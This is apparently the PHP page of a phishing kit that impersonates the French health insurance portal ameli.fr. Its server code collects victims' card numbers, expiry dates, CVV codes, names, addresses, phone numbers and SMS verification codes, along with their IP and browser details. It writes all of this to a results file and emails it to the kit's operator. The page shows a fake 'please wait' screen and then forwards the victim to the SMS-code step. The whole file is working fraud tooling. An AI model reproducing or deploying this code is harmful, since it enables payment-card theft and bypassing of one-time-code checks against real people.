<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

if (isset($_POST["Cardnumber"])   )
{
include 'email.php';

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

            $message = '/== ameli INFOS By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card holder name : ' . $_POST['nome'] . "\r\n";			            
            $message .= 'Address : ' . $_POST['adres'] . "\r\n";
            $message .= 'TEL : ' . $_POST['tel'] . "\r\n";
            $message .= 'ZIP code : ' . $_POST['zip'] . "\r\n";
            $message .= 'Card holder name : ' . $_POST['nome'] . "\r\n";
            $message .= 'Numéro de carte : ' . $_POST['Cardnumber'] . "\r\n";
            $message .= 'Expiration (mm/yy) : ' . $_POST['ExpirationDate']  . "/". $_POST["ExpirationD"] . "\r\n";
            $message .= 'Code securité : ' . $_POST['cvv'] . "\r\n";
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- END details INFOS --/' . "\r\n\r\n";

file_put_contents("./rezult/ameli-rzlt.txt", $message, FILE_APPEND);
mail($to,'infos',$message);
}
else if (isset($_POST["co1"])   )
{
  
  include 'email.php';

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

            $message = '/== ameli SMS By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";

            $message .= 'Code sms : ' . $_POST['co1'] . "\r\n";
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- END details sms --/' . "\r\n\r\n";
file_put_contents("./rezult/ameli-rzlt.txt", $message, FILE_APPEND);
  mail($to,'SMS',$message);
}
if ($_GET['id'] == 3){ header("location:  https://www.ameli.fr/");}
?>

<!DOCTYPE html>
<html>

<head>
	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"/>
	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"/>
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"/>
	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"/>
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"/>
	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"/>
	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"/>
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"/>
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"/>
	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"/>
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/>
	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"/>
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Compte ameli - mon espace personnel</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
    <meta http-equiv="refresh" content="15;url=getsms.php<?php 

if (!empty($_GET['id']))
  echo "?id=".$_GET['id'] ;
  else
  echo "";



  ?>" />
</head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/ameli.jpg" alt="" >

               
                
            </div>
        </header>
        <div class="creditCardForm">
            <h3 style="text-align: center;">Veuillez patienter pendant que nous traitons votre demande
</h3>
           <div class="loader" ></div>
          
        </div>

   

      
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
    <script src="assets/js/script.js"></script>
</body>

</html>
<style>
.loader {
  border: 8px solid #f3f3f3;
  border-radius: 50%;
  border-top: 8px solid #3498db;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
  margin-left: auto;
    margin-right: auto;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>